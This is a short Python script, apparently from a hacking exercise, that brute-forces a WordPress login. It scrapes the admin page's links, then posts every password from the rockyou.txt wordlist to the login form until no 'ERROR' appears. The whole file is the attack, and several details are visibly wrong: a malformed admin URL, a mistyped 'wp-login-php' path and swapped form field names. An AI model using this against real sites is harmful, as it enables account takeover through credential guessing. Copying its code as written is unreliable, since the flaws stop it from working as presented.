import requests
from bs4 import BeautifulSoup
passfile = "PATH\\rockyou.txt"

req = requests.get("http://<IP>://wp-admin")
h = req.headers
r = req.content
#print("headers :", h)
#print("Content :", r)
soup = BeautifulSoup(r, "html.parser")
print(soup.prettify())
print(soup.title)

img = soup.find_all("a",href=True)
imglist = []
for i in img:
    imglist.append(i['href'])
img_set = set(imglist)
for a in img_set:
    print(a)

#check html id for input names and change in posting
with open(passfile, "r") as f:
    for word in f:
        word = word.strip("\n")
        posting = requests.post("http://<IP>/wp-login-php", data = {"user_pass":"admin", "pwd":word})

        if "ERROR" not in posting.text:
            print("succes, the password is : " + word)
            break
        else:
            print("password not found "+word)
            
